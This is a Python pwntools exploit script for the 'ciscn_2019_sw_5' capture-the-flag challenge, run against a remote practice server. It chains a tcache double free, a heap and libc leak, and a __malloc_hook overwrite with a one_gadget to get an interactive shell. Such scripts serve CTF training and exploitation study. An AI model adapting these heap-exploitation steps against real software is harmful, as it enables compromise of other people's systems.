from pwn import *

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + s)


def alloc(title, content):
    sla(b'>> ', b'1')
    sa(b'title', title)
    sa(b'content:\n', content)

def delete(idx):
    sla(b'>> ', b'2')
    sla(b'index', str(idx).encode())

def exp():
    alloc(b'/bin/sh\x00', b'a') #0
    alloc(b'a', b'a') #1
    alloc(b'a', b'a' * 8 + p64(0) + p64(0x61)) #2

    delete(0)
    delete(0)

    alloc(b'\x1e\x10', b'a') #3
    heap_base = u64(rv(6).ljust(8, b'\x00')) - 0x1e
    success('heap_base -> 0x%x' % heap_base)

    #fake chunk and fd -> #4
    alloc(b'\x00', p64(heap_base + 0x280) + p64(heap_base + 0x268) + p64(0x101) + p64(heap_base + 0x270)) #4
    #tcache hijack
    alloc(b'\xff', b'\x00' * 0x5a + p64(heap_base + 0x280)) #5
    alloc(b'a', b'a') #6

    delete(6)

    alloc(b'a' * 8, b'a' * 0x10) #7
    ru(b'a' * 0x18)

    libc_base = u64(p.recvuntil(b'\x7f', timeout=0.1)[-6:].ljust(8, b'\x00')) - 0x70 - libc.sym['__malloc_hook']
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    one_gadgets = [0x4f365, 0x4f3c2, 0x10a45c]
    one_gadgets_buu = [0x4f2c5, 0x4f322, 0x10a38c]
    one = libc_base + one_gadgets_buu[1]
    success('libc_base -> 0x%x' % libc_base)

    alloc(b'a', b'a' * 0x10 + p64(malloc_hook)) #8
    alloc(b'a', b'a') #9
    alloc(p64(one), b'a') #10
    sla(b'>> ', b'1')

    p.interactive()
    
libc = ELF('libc-2.27.buu.so')

while True:
    try:
        #p = process('./ciscn_2019_sw_5')
        p = remote('node4.buuoj.cn', 29051)
        exp()
        break
    except:
        p.close()